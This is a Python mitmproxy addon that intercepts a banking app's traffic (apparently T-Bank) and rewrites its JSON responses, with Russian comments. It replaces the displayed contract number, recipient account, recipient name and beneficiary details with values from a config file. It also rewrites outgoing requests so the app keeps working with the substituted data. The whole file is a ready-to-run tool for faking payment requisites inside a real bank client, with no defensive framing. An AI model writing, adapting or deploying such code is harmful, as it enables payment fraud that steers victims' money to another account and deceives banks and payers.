from mitmproxy import http
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from bank_filter import (
    is_bank_flow,
    ensure_response_decoded,
    bank_debug_enabled,
    is_jsonish_response,
    flow_statements_spravki_context,
    url_prohibit_proxy_json_mutation,
)

CONFIG_FILE = os.path.join(os.path.dirname(__file__), "config.json")

def get_config():
    with open(CONFIG_FILE, "r", encoding="utf-8") as f:
        cfg = json.load(f)
    return cfg["reki"]

real_id = None

def response(flow: http.HTTPFlow) -> None:
    global real_id
    url = flow.request.pretty_url

    if not is_bank_flow(flow):
        return
    if not flow.response:
        return
    if flow_statements_spravki_context(flow):
        return
    ensure_response_decoded(flow)
    if not flow.response.text:
        if bank_debug_enabled():
            print(f"[reki] пустой ответ: {url[:120]}")
        return

    if not is_jsonish_response(flow):
        return

    try:
        reki_cfg = get_config()
        NEW_CONTRACT = reki_cfg["contract"]
        NEW_ACCOUNT = reki_cfg["account"]
        NEW_RECIPIENT = reki_cfg["recipient"]
        NEW_BENEFICIARY = reki_cfg["beneficiary"]
    except:
        return
    
    if not real_id:
        try:
            data = json.loads(flow.response.text)
            if "account_group_requisites" in url and "payload" in data and len(data["payload"]) > 0:
                if "id" in data["payload"][0]:
                    real_id = data["payload"][0]["id"]
            elif (
                ("accounts_light_ib" in url or ("t-bank-app" in url.lower() and "accounts_light" in url.lower()))
                and "payload" in data
                and isinstance(data["payload"], list)
            ):
                for item in data["payload"]:
                    if "id" in item:
                        real_id = item["id"]
                        break
        except:
            pass
    
    # Подмена номера договора только у основного продукта (как в реквизитах).
    # Раньше подменяли id у ВСЕХ карт/счетов в списке — из‑за этого в «Мой банк» дублировались продукты.
    if "accounts_light_ib" in url or (
        "t-bank-app" in url.lower() and "accounts_light" in url.lower()
    ):
        try:
            data = json.loads(flow.response.text)
            if "payload" in data and isinstance(data["payload"], list):
                pl = data["payload"]
                matched = False
                for item in pl:
                    if not isinstance(item, dict) or "id" not in item:
                        continue
                    if real_id is not None and item.get("id") == real_id:
                        item["id"] = NEW_CONTRACT
                        matched = True
                if not matched and pl:
                    first = pl[0]
                    if isinstance(first, dict) and "id" in first:
                        first["id"] = NEW_CONTRACT
                flow.response.text = json.dumps(data, ensure_ascii=False)
        except Exception:
            pass
        return
    
    if "account_group_requisites" in url:
        try:
            data = json.loads(flow.response.text)
            modified = False
            
            if "payload" in data and len(data["payload"]) > 0:
                if "id" in data["payload"][0]:
                    data["payload"][0]["id"] = NEW_CONTRACT
                    modified = True
                
                if "requisites" in data["payload"][0] and len(data["payload"][0]["requisites"]) > 0:
                    req = data["payload"][0]["requisites"][0]
                    
                    if "recipientExternalAccount" in req:
                        req["recipientExternalAccount"] = NEW_ACCOUNT
                        modified = True
                    
                    if "recipient" in req:
                        req["recipient"] = NEW_RECIPIENT
                        modified = True
                    
                    if "beneficiaryInfo" in req:
                        req["beneficiaryInfo"] = NEW_BENEFICIARY
                        modified = True
            
            if modified:
                flow.response.text = json.dumps(data, ensure_ascii=False)
                
        except Exception as e:
            pass

def request(flow: http.HTTPFlow) -> None:
    global real_id
    url = flow.request.pretty_url

    if not is_bank_flow(flow):
        return
    
    try:
        reki_cfg = get_config()
        NEW_CONTRACT = reki_cfg["contract"]
    except:
        return
    
    if real_id and "account_group_requisites" in url and f"account={NEW_CONTRACT}" in url:
        flow.request.url = url.replace(f"account={NEW_CONTRACT}", f"account={real_id}")

print("[+] reki.py загружен (динамический конфиг)")